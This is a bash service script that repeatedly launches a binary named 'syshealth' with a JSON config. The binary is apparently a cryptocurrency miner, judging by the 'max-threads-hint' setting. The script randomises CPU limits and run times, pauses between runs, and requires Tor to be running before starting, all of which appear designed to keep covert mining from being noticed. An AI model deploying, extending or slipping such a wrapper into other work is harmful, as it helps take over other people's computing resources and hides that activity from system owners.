#!/bin/bash
UTIL_DIR="/opt/utilities"
BIN="${UTIL_DIR}/syshealth"
CONFIG="${UTIL_DIR}/config/preferences.json"
PID_FILE="/var/run/syshealth.pid"

# Run 3-5 hours, pause 5 minutes
MIN_RUN_TIME=10800
MAX_RUN_TIME=18000
PAUSE_TIME=300

# CPU percentages to randomly choose from after each pause
CPU_OPTIONS=(40 60 75)

# Seed RANDOM with better entropy
RANDOM=$(od -An -tu4 -N4 /dev/urandom | tr -d ' ')

start_service() {
    "${BIN}" --config="${CONFIG}" --no-color &
    echo $! > "${PID_FILE}"
}

stop_service() {
    if [ -f "${PID_FILE}" ]; then
        kill $(cat "${PID_FILE}") 2>/dev/null
        rm -f "${PID_FILE}"
    fi
    pkill -f syshealth 2>/dev/null || true
}

check_network() {
    if ! pgrep -x tor > /dev/null 2>&1; then
        echo "[!] Tor not running, restarting..."
        stop_service
        bash "${UTIL_DIR}/scripts/network.sh" || true
    fi
}

get_random_runtime() {
    local range=$((MAX_RUN_TIME - MIN_RUN_TIME))
    local random_offset=$((RANDOM * RANDOM % range))
    echo $((MIN_RUN_TIME + random_offset))
}

get_random_cpu() {
    # Reseed for each call to ensure randomness
    RANDOM=$(od -An -tu4 -N4 /dev/urandom | tr -d ' ')
    local idx=$((RANDOM % ${#CPU_OPTIONS[@]}))
    echo "${CPU_OPTIONS[$idx]}"
}

update_cpu_config() {
    local cpu_percent=$1
    sed -i "s/\"max-threads-hint\": [0-9]*/\"max-threads-hint\": ${cpu_percent}/" "${CONFIG}"
    echo "[*] CPU limit set to ${cpu_percent}%"
}

while true; do
    check_network
    NEW_CPU=$(get_random_cpu)
    update_cpu_config $NEW_CPU
    start_service
    RUNTIME=$(get_random_runtime)
    echo "[*] Running for $((RUNTIME/3600))h $((RUNTIME%3600/60))m at ${NEW_CPU}% CPU"
    ELAPSED=0
    while [ $ELAPSED -lt $RUNTIME ]; do
        sleep 300
        ELAPSED=$((ELAPSED + 300))
        check_network
    done
    stop_service
    echo "[*] Pausing for ${PAUSE_TIME}s..."
    sleep ${PAUSE_TIME}
done
